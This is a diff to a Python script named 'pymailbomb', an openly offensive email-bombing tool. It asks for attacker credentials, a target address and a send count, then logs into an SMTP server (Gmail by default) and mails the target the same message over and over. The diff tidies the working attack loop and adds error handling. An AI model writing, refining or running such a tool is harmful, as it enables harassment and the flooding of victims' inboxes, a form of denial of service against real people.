@@ -40,28 +40,21 @@ def main():
     menu()
 def menu():
     try:
-        name = input("Anon name: ")
-        mail = input("Attacker mail: ")
-        passw = input("Attacker passw: ")
-        target = input("Target mail: ")
-        quantity = input("# sends")
-        subject = input("Subject :")
-        body = input("Message: ")
+        name, mail, passw = input("Anon name: "), input("Attacker mail: "), input("Attacker passw: ")
+        target, quantity, subject, body = input("Target mail: "), input("# sends"), input("Subject :"), input("Message: ")
         print(f'{Color.HEADER} Leave the info bellow in blank to use [smtp.gmail.com:587]{Color.WHITE}')
         smtpserver = input(f"[{Color.ALERT}Default{Color.WHITE}] smtp.gmail.com - SMTP SERVER: ")
         smtpport = input(f"[{Color.ALERT}Default{Color.WHITE}] 587 - SMTP PORT: ")
         if smtpserver == '': smtpserver = 'smtp.gmail.com'
         if smtpport == '': smtpport = '587'
         connection = smtplib.SMTP(smtpserver, smtpport)
-        connection.ehlo() , connection.starttls() , connection.login(mail,passw)
+        connection.ehlo(), connection.starttls(), connection.login(mail,passw)
         for i in range(1,int(quantity)+1):
             subject = subject
-            body += f'\n {name}.'
             connection.sendmail(mail, target, body)
-            print(f'[{Color.GREEN}+{Color.WHITE}] {i} mail sent.', end = '\r')
-            sleep(1)
-        print('',end='\n')
-        connection.quit
+            print(f'[{Color.GREEN}+{Color.WHITE}] {i} mail sent. ', end = '\r' )
+            sleep(1), sys.stdout.flush()
+        print('',end='\n'), connection.quit
         print(f'{Color.HEADER}Finished{Color.WHITE}')
         sys.exit(1)
     except smtplib.SMTPAuthenticationError:
@@ -70,7 +63,9 @@ def menu():
     except KeyboardInterrupt:
         print(f'{Color.HEADER} pymailbomb has been stopped')
         sys.exit(1)
-        
+    except Exception as error:
+        print(f'{Color.DANGER} - {error} {Color.WHITE}')
+        sys.exit(1)        
 if __name__ == '__main__':
     print(banner())
     main()
